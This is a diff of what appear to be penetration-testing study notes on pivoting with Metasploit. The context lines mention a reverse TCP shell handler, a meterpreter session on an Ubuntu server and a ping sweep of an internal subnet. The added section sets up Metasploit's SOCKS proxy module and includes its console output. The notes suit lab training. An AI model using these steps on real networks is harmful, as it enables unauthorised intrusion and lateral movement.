@@ -36,3 +36,38 @@ generic/shell_reverse_tcp msf6 exploit(multi/handler) > set lhost 0.0.0.0 lhost 
 Then doing a simple chmod the file then running `./` 
 While on the ubuntu server one will have the meterpreter.
 `meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`
+
+### Configuring MSF's SOCKS Proxy
+```bash
+msf6 > use auxiliary/server/socks_proxy
+
+msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
+SRVPORT => 9050
+msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
+SRVHOST => 0.0.0.0
+msf6 auxiliary(server/socks_proxy) > set version 4a
+version => 4a
+msf6 auxiliary(server/socks_proxy) > run
+[*] Auxiliary module running as background job 0.
+
+[*] Starting the SOCKS proxy server
+msf6 auxiliary(server/socks_proxy) > options
+
+Module options (auxiliary/server/socks_proxy):
+
+   Name     Current Setting  Required  Description
+   ----     ---------------  --------  -----------
+   SRVHOST  0.0.0.0          yes       The address to listen on
+   SRVPORT  9050             yes       The port to listen on
+   VERSION  4a               yes       The SOCKS version to use (Accepted: 4a,
+                                        5)
+
+
+Auxiliary action:
+
+   Name   Description
+   ----   -----------
+   Proxy  Run a SOCKS proxy server
+   
+   # also putting in jobs is an option
+```
